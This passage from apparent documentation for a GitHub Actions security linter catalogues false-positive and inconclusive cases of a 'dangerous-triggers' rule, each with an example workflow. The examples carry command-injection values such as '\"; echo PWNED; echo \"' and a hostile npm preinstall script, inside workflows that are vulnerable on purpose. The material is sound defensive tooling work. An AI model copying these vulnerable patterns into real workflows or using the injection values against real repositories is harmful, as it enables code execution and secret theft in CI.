      ```yaml
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
                configuration-path: ${{ vars.LABELER_CONFIG }}
      ```
- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/dangerous-triggers-unknown, whose content is
    #   the workflow of the true positive token-write (token-write.yml) of the
    #   rule, with on: workflow_call in place of the on of token-write.yml. The
    #   linter asked the fact workflow.definition for the reusable workflow and
    #   got no answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: opening the issue starts the job a, which has no if
    #   and waits for no approval, with a token that has contents: write; the
    #   script becomes echo ""; echo PWNED; echo "", and the shell runs echo
    #   PWNED as a command, so any command the attacker writes in its place runs
    #   in the job that holds that token.
    on: issues
    permissions: {}
    jobs:
      c:
        uses: example-org/dangerous-triggers-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- fork-flag-review: a job on pull_request_review or pull_request_review_comment whose if: condition lets the job run only when the head repository of the pull request is a fork, such as a job whose if: condition is github.event.pull_request.head.repo.fork: on a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. The run of a review of a pull request from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review). The rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reports the job as if the job ran for a review of a pull request from a branch of the repository
  - finding kinds: dangerous-triggers.secrets, dangerous-triggers.token-write
  - disposition: todo (needs: fact)
  - example: fork-flag-review.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_review, a step echoes the review's body,
    #   written into the run: script with ${{ }}, and runs ./deploy with the
    #   secret DEPLOY_KEY in KEY, in a job that runs only when the head
    #   repository of the pull request is a fork.
    # reason: the job runs only when the head repository of the pull request
    #   is a fork. On a pull request from a branch of the repository, the head
    #   repository is the repository itself, so in a repository that is not a
    #   fork the job runs only for a review of a pull request from a fork. In
    #   a public repository, the run of such a review has no secrets and a
    #   token that only reads; in a private repository, the run has neither
    #   secrets nor a token that writes unless the repository gives secrets or
    #   a token that writes to the runs of pull requests from forks (the
    #   undetected form fork-review).
    # cause: the rule does not read whether the repository that runs the
    #   workflow (not the head repository of the pull request) is a fork, and
    #   reads the job as if the job ran for a review of a pull request from a
    #   branch of the repository.
    # attack-value: github.event.review.body = "\"; echo PWNED; echo \""
    # attack-run-behavior: in a public repository that is not a fork, a review
    #   of a pull request from a branch of the repository does not start the
    #   job, as the head repository of such a pull request is the repository
    #   itself; a review of a pull request from a fork starts the job with no
    #   secrets and a token that only reads, so the value reaches no secret
    #   and no token that writes.
    on: pull_request_review
    permissions: {}
    jobs:
      a:
        if: github.event.pull_request.head.repo.fork
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.review.body }}" && ./deploy
            env:
              KEY: ${{ secrets.DEPLOY_KEY }}
    ```
- approval-if: an if that lets in only the comments of the owner and the members (author_association OWNER, MEMBER), in a job that reads nothing of the issue or pull request the comment is on, where every member has a role that can write: such a comment on an attacker's issue runs the job, but the job reads nothing that the attacker wrote; the rule does not tell such a job apart from a job that reads what the attacker wrote. A member whose role is read only is the undetected form insider-association
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: approval-if.yml (workflow, false-positive)
    ```yaml
    # situation: the job runs on issue_comment with contents: write, only for
    #   the owner's comment, and reads nothing but that comment.
    # reason: the owner's comment on an attacker's issue runs the job too, but
    #   with nothing of the attacker's.
    # cause: the rule does not tell apart a job that reads nothing of the issue
    #   the comment is on.
    # attack-value: github.event.comment.body = "\"; echo PWNED; echo \""
    # attack-run-behavior: the attacker's comment has author_association NONE,
    #   FIRST_TIMER, FIRST_TIME_CONTRIBUTOR or CONTRIBUTOR, so the if is false
    #   and the job a is skipped; a comment of the owner, on the attacker's
    #   issue too, runs it, and the script echoes the owner's body, nothing of
    #   the attacker's.
    on: issue_comment
    jobs:
      a:
        if: github.event.comment.author_association == 'OWNER'
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - run: echo "${{ github.event.comment.body }}"
    ```
- no-sink: a job in which an attacker can run no code: the rule does not read the sinks, and holds this as the precondition of AT:P
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: no-sink.yml (workflow, false-positive)
    ```yaml
    # situation: an issue runs the job with a token that may write issues, and
    #   the job only labels the issue.
    # reason: nothing of the attacker's reaches code.
    # cause: the rule does not read the sinks, and holds that the attacker can
    #   run code as the precondition of AT:P.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: opening the issue starts the job a with issues:
    #   write; the title is in no step, and gh issue edit gets only NUMBER, the
    #   number GitHub gives the issue, so the job adds the label triage and runs
    #   nothing of the attacker's.
    on: issues
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          issues: write
        steps:
          - run: gh issue edit "$NUMBER" --add-label triage
            env:
              NUMBER: ${{ github.event.issue.number }}
              GH_TOKEN: ${{ github.token }}
    ```
- environment-protected: a job whose environment has required reviewers, who approve it before it runs; for the kind dangerous-triggers.secrets of a job that calls a reusable workflow, a job whose called workflow has such an environment on every job that reads the secrets: GitHub passes the secrets only to the runners of the jobs that read the secrets, and the job that calls has no environment of its own (GitHub does not accept environment on a job that calls a reusable workflow)
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - fact kinds:
    - repo.environment-protected (provider: repo-setting, answer that removes the finding: true)
  - example: environment-protected.yml (workflow, false-positive)
    ```yaml
    # situation: the job runs on issues in the environment production, with a
    #   secret.
    # reason: the environment production has required reviewers, who approve the
    #   job before it runs.
    # cause: unless a file of facts or --fact says that the environment has
    #   required reviewers (repo.environment-protected true), the rule reports the
    #   finding. When no source answers repo.environment-protected, the finding is
    #   conditional.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: opening the issue queues the job a for the
    #   environment production, which waits for a required reviewer; until one
    #   approves, no step runs, neither the script, which would become echo "";
    #   echo PWNED; echo "" && ./deploy, nor anything with KEY.
    on: issues
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        environment: production
        steps:
          - run: echo "${{ github.event.issue.title }}" && ./deploy
            env:
              KEY: ${{ secrets.DEPLOY_KEY }}
    ```
- inherit-unread: a job that calls with secrets: inherit a reusable workflow of the repository whose contents the linter does not have, and whose jobs read no secret, by name or without a name: a workflow file that is not among the inputs, or the repository's own workflow called by owner/repo/path@ref when the linter is given the name of the repository (--repo); also a called workflow whose contents the linter has, when a job of the called workflow calls with secrets: inherit, in turn, such a reusable workflow. GitHub passes the runner of a job of the called workflow only the secrets that the job reads, and the rule assumes that the jobs of a called workflow whose contents the linter does not have read every secret
  - finding kinds: dangerous-triggers.secrets
  - disposition: todo (needs: repo-file)
  - example: inherit-unread.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, the job calls ./.github/workflows/called.yml with
    #   secrets: inherit and permissions: {}. The jobs of called.yml read no
    #   secret, by name or without a name, and called.yml is not among the files
    #   given to the linter.
    # reason: GitHub passes the runner of a job of a called workflow only the
    #   secrets that the job reads, so no secret is passed to the runners of the
    #   jobs of called.yml; with permissions: {}, a flaw in called.yml gives an
    #   attacker no secret and no token that writes.
    # cause: the linter does not have the contents of called.yml, and the rule
    #   assumes that the jobs of called.yml read every secret.
    # attack: the attacker opens an issue, and a flaw in a job of called.yml (an
    #   injection of the issue's title, for example) runs the attacker's code in
    #   the job of the flaw.
    # attack-run-behavior: the issue starts this workflow, which runs the jobs
    #   of called.yml with no secret in the runners of those jobs; the
    #   attacker's code finds no secret in the runner.
    on: issues
    permissions: {}
    jobs:
      triage:
        uses: ./.github/workflows/called.yml
        secrets: inherit
    ```
- remote-inherit-unread: a job that calls with secrets: inherit a reusable workflow of another repository that the fact workflow.definition does not answer, and whose jobs read no secret, by name or without a name, directly or through a called workflow whose contents the linter has; or a job of a repository of a user account that calls with secrets: inherit a reusable workflow of a repository of an organization, whose jobs get no secret of the calling repository (observed on 2026-10-22: the called workflow got only github_token). The rule assumes that the jobs of a called workflow whose contents the linter does not have read every secret, and does not compare the owner of the calling repository with the owner of the called repository
  - finding kinds: dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: remote-inherit-unread.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, the job calls the reusable workflow
    #   .github/workflows/triage.yml of the repository example-org/shared, of
    #   the same organization, at a commit, with secrets: inherit and
    #   permissions: {}. The jobs of triage.yml read no secret, by name or
    #   without a name, and the fact workflow.definition has no answer for
    #   triage.yml.
    # reason: GitHub passes the runner of a job of a called workflow of another
    #   repository of the organization only the secrets that the job reads, so
    #   no secret is passed to the runners of the jobs of triage.yml; with
    #   permissions: {}, a flaw in triage.yml gives an attacker no secret and no
    #   token that writes.
    # cause: without an answer of workflow.definition, the linter does not have
    #   the contents of triage.yml, and the rule assumes that the jobs of
    #   triage.yml read every secret.
    # attack: the attacker opens an issue, and a flaw in a job of triage.yml (an
    #   injection of the issue's title, for example) runs the attacker's code in
    #   the job of the flaw.
    # attack-run-behavior: the issue starts this workflow, which runs the jobs
    #   of triage.yml with no secret in the runners of those jobs; the
    #   attacker's code finds no secret in the runner.
    on: issues
    permissions: {}
    jobs:
      triage:
        uses: example-org/shared/.github/workflows/triage.yml@0123456789abcdef0123456789abcdef01234567
        secrets: inherit
    ```
- named-unread: a job that passes secrets one by one under secrets: to a reusable workflow whose contents the linter does not have (a workflow file that is not among the inputs, the repository's own workflow called by owner/repo/path@ref, or a reusable workflow of another repository that the fact workflow.definition does not answer), when no job of the called workflow reads any of the passed secrets: GitHub passes the runner of a job of the called workflow only the passed secrets that the job reads, so no passed secret reaches a runner, and the rule assumes that the jobs of the called workflow read every passed secret. When the jobs read some of the passed secrets, the finding holds, and the argument secrets names more secrets than GitHub passes
  - finding kinds: dangerous-triggers.secrets
  - disposition: todo (needs: repo-file, fact)
  - example: named-unread.yml (workflow, false-positive)
    ```yaml
    # situation: on issues, the job calls ./.github/workflows/triage.yml with
    #   permissions: {} and passes the secret LABEL_TOKEN by name, as token. No
    #   job of triage.yml reads token, and triage.yml is not among the files
    #   given to the linter.
    # reason: GitHub passes the runner of a job of a called workflow only the
    #   passed secrets that the job reads, so LABEL_TOKEN is passed to no runner
    #   of triage.yml; with permissions: {}, a flaw in triage.yml gives an
    #   attacker no secret and no token that writes.
    # cause: the linter does not have the contents of triage.yml, and the rule
    #   assumes that the jobs of triage.yml read every secret that the job
    #   passes.
    # attack: the attacker opens an issue, and a flaw in a job of triage.yml (an
    #   injection of the issue's title, for example) runs the attacker's code in
    #   the job of the flaw.
    # attack-run-behavior: the issue starts this workflow, which runs the jobs
    #   of triage.yml with no secret in the runners of those jobs; the
    #   attacker's code finds no secret in the runner.
    on: issues
    permissions: {}
    jobs:
      triage:
        uses: ./.github/workflows/triage.yml
        secrets:
          token: ${{ secrets.LABEL_TOKEN }}
    ```
- default-token-read: a job that writes no permissions, in a repository whose default token is read
  - finding kinds: dangerous-triggers.token-write
  - fact kinds:
    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
  - example: default-token-read.yml (workflow, false-positive)
    ```yaml
    # situation: the job runs on issues and writes no permissions.
    # reason: the repository's default token is read, so the token writes
    #   nothing.
    # cause: unless a file of facts or --fact says that the default token is read
    #   (repo.default-token-write false), the rule treats the default token as a
    #   token that may write and reports the finding. When no source answers
    #   repo.default-token-write, the finding is conditional.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: opening the issue starts the job a; the script
    #   becomes echo ""; echo PWNED; echo "", so echo PWNED runs as a command,
    #   in a job whose token has the repository's default, which is read
    #   (repo.default-token-write is false here), and which reads no secret.
    on: issues
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
- label-name-if: a job whose if compares github.event.label.name with == to a string that is not empty, in a workflow on pull_request_target whose types have labeled and an activity type whose payload has no label, such as types: &#91;labeled, opened] (the payload of opened, synchronize and reopened has no label): on that activity type, github.event.label.name is an empty string, and the if is false, so the job runs only after a label is added; the rule does not read github.event.label.name as an empty string on that activity type, and reports the job as a job that runs on that activity type without an approval
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: label-name-if.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target with types labeled and opened, the job
    #   runs only if github.event.label.name is safe to test; the job checks out
    #   the pull request's head and runs npm ci.
    # reason: the payload of opened has no label, so github.event.label.name is
    #   an empty string and the if is false on opened; the job runs only on
    #   labeled, after a maintainer adds the label safe to test (then a push
    #   after the label is untrusted-checkout-toctou's).
    # cause: the rule does not read github.event.label.name as an empty string
    #   on the other activity type, and reads the job as a job that runs on
    #   opened without an approval.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the run on opened skips the job; npm ci runs only
    #   after a maintainer adds the label safe to test to the pull request.
    on:
      pull_request_target:
        types: [labeled, opened]
    jobs:
      build:
        if: github.event.label.name == 'safe to test'
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - run: npm ci
    ```
- unmatchable-pattern: a label of the configuration of actions/labeler whose globs or regular expressions match no path or no branch name, such as the glob pages/\*\* together with the negated glob !pages/\*\*: the rule reads each glob and each regular expression as one that a pull request can match
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file that is under
    #   site/ and not under site/, which no file is; labeled.yml runs on
    #   pull_request_target on labeled when the label is safe-to-test, and the job
    #   reads the secret NPM_TOKEN, checks out the head of the pull request and
    #   runs npm ci.
    # reason: no file matches both globs, so actions/labeler never adds the label,
    #   and only a person adds it.
    # cause: the rule reads each glob as one that a pull request can match.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; actions/labeler adds no label, and labeled.yml
    #   does not run until a person adds the label safe-to-test.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - all-globs-to-any-file: ['site/**', '!site/**']
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- labeled-actor-if: an if that compares the actor or the sender of the labeled run with a name or a type, such as github.event.sender.login == 'release-bot' or github.event.sender.type != 'Bot': the actor of a labeled run whose label actions/labeler adds is the account or the app of the token of actions/labeler, the linter does not know the name or the type of the actor, and the rule reads the if as one that the labeled run passes
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file under site/;
    #   labeled.yml runs on pull_request_target on labeled when the label is
    #   safe-to-test and the sender of the run is the account release-bot, and the
    #   job reads the secret NPM_TOKEN, checks out the head of the pull request
    #   and runs npm ci.
    # reason: the personal access token of actions/labeler belongs to an account
    #   other than release-bot, so the sender of the labeled run is not
    #   release-bot, and the job does not run for the label of actions/labeler.
    # cause: the rule does not know the name of the account of the token, and
    #   reads the if as one that the labeled run passes.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; actions/labeler adds the label safe-to-test,
    #   which starts labeled.yml, and the if is false, as the sender of the run is
    #   the account of the token and not release-bot.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test' && github.event.sender.login == 'release-bot'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- labeler-skipped-need: a job whose if calls no status function, that runs actions/labeler or waits for the label that actions/labeler adds (on the activity type labeled, in the job itself or in a job of a reusable workflow that the job calls), and that depends through the needs key on a job whose if calls a status function (for example, if: always()), where the job whose if calls a status function depends through the needs key, directly or through other jobs, on a job that GitHub skips, or that fails, in the run on the pull request of the attacker. GitHub applies a failure or a skip to every job after the skipped or failed job in the chain of the needs key, also after the job whose if calls a status function, so GitHub skips the job that runs actions/labeler or waits for the label, and the step of actions/labeler in a skipped job adds no label. The rule reads the ifs of the chain of the needs key only up to the job whose if calls a status function, and reads the job that runs actions/labeler or waits for the label as a job that runs.
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token in the job label, which needs the job report, whose
    #   if is always(), and report needs the job check, whose if is false for a
    #   pull request from a fork; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file under site/;
    #   labeled.yml runs on pull_request_target on labeled when the label is
    #   safe-to-test, and the job reads the secret NPM_TOKEN, checks out the head
    #   of the pull request and runs npm ci.
    # reason: GitHub skips the job check for the pull request of the attacker, and
    #   a skip applies to every job after the skipped job in the chain of the
    #   needs key, also after the job report, whose if calls always(), so GitHub
    #   skips the job label, and actions/labeler adds no label
    #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-jobs-in-a-workflow-needs.md,
    #   and the observation in https://github.com/actions/runner/issues/2205).
    # cause: the rule reads the ifs of the chain of the needs key of the job label
    #   only up to the job report, whose if calls a status function, and reads the
    #   job label as one that runs.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; GitHub skips the job check, runs the job
    #   report, and skips the job label, so actions/labeler adds no label, and
    #   labeled.yml does not start.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        check:
          if: github.event.pull_request.head.repo.full_name == github.repository
          runs-on: ubuntu-latest
          steps:
            - run: echo checked
        report:
          needs: check
          if: always()
          runs-on: ubuntu-latest
          steps:
            - run: echo reported
        label:
          needs: report
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- labeler-other-user: a step of actions/labeler whose if is true only when a step before the step of actions/labeler has failed (for example, if: failure()), after a step that has no timeout-minutes and that runs the code of the pull request of the attacker as a user that is neither root nor the user of the shell of the step (for example, sudo -u nobody, or su nobody -c), where a failure of the code does not end the step (for example, the left of || true, or the condition of an if statement of the shell script). The code of the attacker runs as a user that is not the user of the shell of the step, so the code of the attacker cannot stop the shell of the step by a signal, and the step does not fail. The rule reads the step that runs the code of the attacker as a step that the attacker can make fail, so the rule reads the step of actions/labeler as a step that runs after a failure.
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs, on pull_request_target, actions/checkout of
    #   the head of the pull request into pr, then sudo -u nobody ./pr/build.sh
    #   || true, then actions/labeler with if: failure() and a personal access
    #   token; the configuration .github/labeler.yml adds the label safe-to-test
    #   to a pull request that changes a file under site/; labeled.yml runs on
    #   pull_request_target on labeled when the label is safe-to-test, and the
    #   job reads the secret NPM_TOKEN, checks out the head of the pull request
    #   and runs npm ci.
    # reason: the step that runs ./pr/build.sh runs the code of the attacker as
    #   the user nobody, and a failure of the code does not end the step (||
    #   true); the code of the attacker runs as a user that is not the user of
    #   the shell of the step, so the code cannot stop the shell of the step,
    #   the step does not fail, and the step of actions/labeler, whose if is
    #   failure(), does not run (observed on 2026-11-16 on ubuntu-latest: kill
    #   from the user nobody to the shell of the step fails with Operation not
    #   permitted).
    # cause: the rule reads the step that runs ./pr/build.sh as a step that the
    #   attacker can make fail, so the rule reads the step of actions/labeler as
    #   a step that runs after a failure.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/ and whose pr/build.sh tries to stop the shell
    #   of the step; the kill fails, the step succeeds, actions/labeler does not
    #   run and adds no label, and labeled.yml does not start.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
                allow-unsafe-pr-checkout: true
                persist-credentials: false
                path: pr
            - run: sudo -u nobody ./pr/build.sh || true
            - uses: actions/labeler@v5
              if: failure()
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- label-combination: a label that actions/labeler adds only together with another label whose presence makes the if of the job false, such as a label blocked that the if excludes with !contains(github.event.pull_request.labels.\*.name, 'blocked') and that actions/labeler adds on the same condition as the label that the job waits for; or a label that actions/labeler does not add, because the labels that actions/labeler would add together with the label are more than changed-files-labels-limit allows: the rule evaluates the if with the one label that the job waits for
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token; the configuration .github/labeler.yml adds the
    #   labels safe-to-test and blocked to a pull request that changes a file
    #   under site/; labeled.yml runs on pull_request_target on labeled when the
    #   label is safe-to-test and the pull request has no label blocked, and the
    #   job reads the secret NPM_TOKEN, checks out the head of the pull request
    #   and runs npm ci.
    # reason: actions/labeler adds blocked whenever it adds safe-to-test, so the
    #   pull request of the attacker has the label blocked, and the job does not
    #   run for it.
    # cause: the rule evaluates the if with the label safe-to-test alone.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; actions/labeler adds safe-to-test and blocked,
    #   and the if of labeled.yml is false.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test' && !contains(github.event.pull_request.labels.*.name, 'blocked')
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      blocked:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - fact kinds:
    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
  - example: pull-request-target-blocked.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target, a step echoes the title of the pull
    #   request, written in by ${{ }}, and runs ./deploy with the secret
    #   DEPLOY_KEY in KEY.
    # reason: the Actions policies of the repository block the runs of the
    #   workflow on pull_request_target: the default policy that GitHub adds to a
    #   public repository without an applicable event policy, from the time when
    #   GitHub enforces the default policy on the repository, or an event policy
    #   whose list of allowed events does not have pull_request_target. GitHub's
    #   documents say that GitHub evaluates the policies before a run, and that a
    #   run that a policy does not allow fails with an error; the documents do not
    #   say whether a job of such a run starts before the run fails, and the rule
    #   assumes that no job starts.
    # cause: unless a file of facts or --fact says that the Actions policies block
    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
    #   rule reports the finding. When no file of facts and no --fact answers
    #   repo.pull-request-target-allowed, the finding is conditional.
    # attack-value: github.event.pull_request.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the pull request of the attacker triggers
    #   pull_request_target, and the run fails with an error, and no job of the
    #   run starts (the assumption of the reason), so no step has KEY.
    on: pull_request_target
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.pull_request.title }}" && ./deploy
            env:
              KEY: ${{ secrets.DEPLOY_KEY }}
    ```
- actions-policy: a run that the Actions policies of the repository block, in four cases where the rule does not take the policies into account. First, an event policy that blocks an event of the attackers other than pull_request_target (such as issue_comment) in a workflow whose on has that event: the rules ask a fact only for pull_request_target. Second, an actor rule that does not allow the account of the attacker (for example, an actor rule that allows only the repository roles with write access): repo.pull-request-target-allowed is one value for all the runs of a workflow file on pull_request_target, and an actor rule blocks a run by the account that starts the run, so the fact cannot tell what an actor rule blocks. Third, a workflow whose on has pull_request_target and another event: the rule does not ask repo.pull-request-target-allowed for such a workflow, because a run on the other event can reach the job. When the if of the job is false on the other event, so that the job runs only on pull_request_target, and a policy blocks pull_request_target, the finding is a false positive. Fourth, a reusable workflow (on workflow_call) or an action that only workflows on pull_request_target call: the rule asks repo.pull-request-target-allowed only of a workflow whose on has pull_request_target, not of the reusable workflow or the action, so a finding in the reusable workflow or the action is still reported when the policies block the runs of every caller
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: actions-policy.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target, a step echoes the title of the pull
    #   request, written in by ${{ }}, and runs ./deploy with the secret
    #   DEPLOY_KEY in KEY.
    # reason: an actor rule of the Actions policies of the repository allows
    #   only the repository roles with write access to trigger the workflow, so a
    #   run that a pull request from an account without write access triggers
    #   fails. GitHub's documents say that GitHub evaluates the policies before a
    #   run, and that a run that a policy does not allow fails with an error; the
